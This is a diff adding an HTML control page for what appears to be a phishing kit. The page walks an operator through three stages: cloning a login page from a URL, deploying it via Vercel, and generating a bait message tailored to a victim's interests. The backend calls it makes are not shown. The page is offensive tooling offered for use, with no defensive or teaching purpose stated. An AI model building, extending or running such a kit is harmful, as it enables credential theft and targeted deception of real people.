@@ -1,0 +1,183 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create New Phishing Site</title>
+    <style>
+        body {
+            background-color: #000000;
+            color: #00ff00;
+            font-family: 'Consolas', monospace;
+            padding: 40px;
+        }
+        h1 { font-size: 28px; margin-bottom: 30px; }
+        h2 { font-size: 20px; margin-top: 40px; }
+        .stage { margin-bottom: 40px; }
+        input[type="text"], textarea {
+            background-color: #1a1a1a;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 10px;
+            font-family: 'Consolas', monospace;
+            font-size: 14px;
+            width: 500px;
+        }
+        button {
+            background-color: #0ea10e;
+            color: #00ff00;
+            border: none;
+            padding: 10px 20px;
+            font-family: 'Consolas', monospace;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:disabled { background-color: #333; cursor: not-allowed; }
+        button:hover:not(:disabled) { background-color: #0c8f0c; }
+        .output {
+            background-color: #1a1a1a;
+            border: 1px solid #00ff00;
+            padding: 15px;
+            margin-top: 20px;
+            min-height: 100px;
+            max-height: 200px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+        .back-link { color: #00ff00; text-decoration: none; display: inline-block; margin-bottom: 20px; }
+        .back-link:hover { text-decoration: underline; }
+        .progress { display: none; color: #ffff00; margin-top: 10px; }
+    </style>
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+</head>
+<body>
+    <a href="/" class="back-link">← Back to Menu</a>
+    <h1>Create New Phishing Site</h1>
+    
+    <div class="stage" id="stage1">
+        <h2>Stage 1: Generate Phishing Page</h2>
+        <p>Enter the URL to be turned into a phishing page:</p>
+        <input type="text" id="url" placeholder="https://example.com/login">
+        <br>
+        <button onclick="generatePage()">Generate</button>
+        <div class="progress" id="progress1">Generating phishing page...</div>
+    </div>
+    
+    <div class="stage" id="stage2" style="display: none;">
+        <h2>Stage 2: Deployment</h2>
+        <p>The page will be deployed via Vercel.</p>
+        <button onclick="deployPage()" id="deployBtn">Confirm Deployment</button>
+        <div class="progress" id="progress2">Deploying...</div>
+    </div>
+    
+    <div class="stage" id="stage3" style="display: none;">
+        <h2>Stage 3: Generate Bait (Message to Victim)</h2>
+        <p>Enter the victim's interests (comma separated):</p>
+        <input type="text" id="interests" placeholder="cryptocurrency, investing, tech">
+        <br>
+        <button onclick="generateBait()">Generate Bait</button>
+        <div class="progress" id="progress3">Generating bait message...</div>
+    </div>
+    
+    <div class="output" id="output"></div>
+    
+    <script>
+        function log(message) {
+            document.getElementById('output').textContent += message + '\n';
+        }
+        
+        async function generatePage() {
+            const url = document.getElementById('url').value.trim();
+            if (!url) {
+                log('Error: Please enter a valid URL.');
+                return;
+            }
+            
+            document.getElementById('progress1').style.display = 'block';
+            
+            try {
+                const response = await fetch('/api/generate-page', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ url })
+                });
+                
+                const data = await response.json();
+                document.getElementById('progress1').style.display = 'none';
+                
+                if (response.ok) {
+                    log(data.message);
+                    document.getElementById('stage2').style.display = 'block';
+                } else {
+                    log('Error: ' + data.error);
+                }
+            } catch (error) {
+                document.getElementById('progress1').style.display = 'none';
+                log('Error: ' + error.message);
+            }
+        }
+        
+        async function deployPage() {
+            document.getElementById('progress2').style.display = 'block';
+            document.getElementById('deployBtn').disabled = true;
+            
+            try {
+                const response = await fetch('/api/deploy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                
+                const data = await response.json();
+                document.getElementById('progress2').style.display = 'none';
+                
+                if (response.ok) {
+                    log('Deployment successful!');
+                    log('URL: ' + data.url);
+                    document.getElementById('stage3').style.display = 'block';
+                } else {
+                    log('Error: ' + data.error);
+                    document.getElementById('deployBtn').disabled = false;
+                }
+            } catch (error) {
+                document.getElementById('progress2').style.display = 'none';
+                log('Error: ' + error.message);
+                document.getElementById('deployBtn').disabled = false;
+            }
+        }
+        
+        async function generateBait() {
+            const interests = document.getElementById('interests').value.trim();
+            if (!interests) {
+                log('Error: Please enter the victim\'s interests.');
+                return;
+            }
+            
+            document.getElementById('progress3').style.display = 'block';
+            
+            try {
+                const response = await fetch('/api/generate-bait', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ interests })
+                });
+                
+                const data = await response.json();
+                document.getElementById('progress3').style.display = 'none';
+                
+                if (response.ok) {
+                    log('\n--- Generated Bait Message ---');
+                    log(data.message);
+                    log('------------------------------\n');
+                } else {
+                    log('Error: ' + data.error);
+                }
+            } catch (error) {
+                document.getElementById('progress3').style.display = 'none';
+                log('Error: ' + error.message);
+            }
+        }
+    </script>
+</body>
+</html>
